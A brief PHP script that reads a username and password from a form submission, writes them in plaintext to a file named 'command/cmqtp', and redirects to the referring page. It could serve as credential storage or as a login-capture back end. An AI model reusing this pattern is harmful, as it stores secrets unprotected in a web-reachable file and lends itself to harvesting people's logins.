<?php
        $Name = "Username:".$_POST['username']."";
        $Pass = "Password:".$_POST['pwd2']."";
        $data = $_POST['username']. PHP_EOL .$_POST['pwd2']. PHP_EOL;
        $file=fopen("command/cmqtp", "w");
        fwrite($file, $data);
        fclose($file);
        echo "<a href=\"javascript:history.go(-1)\">GO BACK</a>";
        if (isset($_SERVER["HTTP_REFERER"])) {
        header("Location: " . $_SERVER["HTTP_REFERER"]);
            }
?>
